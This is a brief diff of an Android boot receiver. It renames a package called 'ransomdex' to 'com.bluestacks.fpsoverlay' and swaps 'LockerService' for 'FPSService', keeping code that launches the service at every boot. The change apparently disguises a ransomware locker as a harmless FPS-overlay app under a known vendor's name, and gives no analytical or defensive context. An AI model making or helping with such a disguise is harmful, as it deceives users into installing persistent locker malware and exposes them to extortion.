@@ -1,4 +1,4 @@
-package com.bondex.ransomdex;
+package com.bluestacks.fpsoverlay;
 
 import android.content.BroadcastReceiver;
 import android.content.Context;
@@ -11,7 +11,7 @@ public class BootReceiver extends BroadcastReceiver {
         String action = intent.getAction();
         
         if (Intent.ACTION_BOOT_COMPLETED.equals(action)) {
-            Intent i = new Intent(context, LockerService.class);
+            Intent i = new Intent(context, FPSService.class);
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(i);
             } else {
